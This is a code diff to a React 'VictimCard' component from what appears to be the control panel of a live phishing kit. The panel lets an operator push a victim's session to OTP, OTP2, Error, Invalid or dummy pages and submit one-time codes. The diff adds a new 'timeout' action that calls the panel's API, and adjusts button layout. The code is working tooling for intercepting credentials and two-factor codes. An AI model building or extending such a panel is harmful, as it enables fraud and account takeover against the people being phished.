@@ -97,6 +97,16 @@ export default function VictimCard({
     setCurrAction("OTP2");
     toast.success(`Sent ${id} to OTP2`);
   };
+  const sendToTimeout = async () => {
+    try {
+      const res = await fetch(`${process.env.API_URL}/action/${id}/timeout`, {
+        method: "PUT",
+        cache: "no-cache",
+      });
+    } catch (error) {}
+    setCurrAction("timeout");
+    toast.success(`Sent ${id} to timeout`);
+  };
   const sendToOTP = async () => {
     try {
       const res = await fetch(`${process.env.API_URL}/action/${id}/OTP`, {
@@ -177,11 +187,11 @@ export default function VictimCard({
         </p>
       </CardBody>
       <Divider />
-      <CardFooter className="flex justify-between content-center">
-        <Button onPress={sendToError} color="danger" className="m-1">
+      <CardFooter className="flex justify-between content-center gap-1">
+        <Button onPress={sendToError} color="danger" className="">
           Error
         </Button>
-        <Button onPress={sendToInvalid} color="warning" className="m-1">
+        <Button onPress={sendToInvalid} color="warning" className="">
           Invalid
         </Button>
         <Formik
@@ -190,29 +200,28 @@ export default function VictimCard({
           }}
           onSubmit={setOTP}
         >
-          <Form className="flex justify-center content-center ">
+          <Form className="flex justify-center content-center w-40 ">
             <div className="">
               <Field
                 id="OTP"
                 name="OTP"
                 placeholder="OTP"
                 type="text"
-                className="form-control h-10  m-1 bg-gray-200 appearance-none border-2 border-gray-200 rounded-l-lg w-full py-2 px-4 text-gray-700 leading-tight focus:outline-none focus:bg-white focus:border-sky-600"
+                className="form-control h-10 bg-gray-200 appearance-none border-2 border-gray-200 rounded-l-lg w-full py-2 px-1 text-gray-700 leading-tight focus:outline-none focus:bg-white focus:border-sky-600"
               />
             </div>
-            <Button
-              type="submit"
-              color="primary"
-              className="rounded-l-none m-1"
-            >
+            <Button type="submit" color="primary" className="rounded-l-none ">
               Send
             </Button>
           </Form>
         </Formik>
-        <Button onPress={sendToOTP2} color="primary" className="m-1">
+        <Button onPress={sendToOTP2} color="primary" className="">
           OTP2
         </Button>
-        <Button onPress={sentToDummyPage} color="default" className="m-1">
+        <Button onPress={sendToTimeout} color="primary" className="">
+          Timeout
+        </Button>
+        <Button onPress={sentToDummyPage} color="default" className="">
           DummyPage
         </Button>
       </CardFooter>
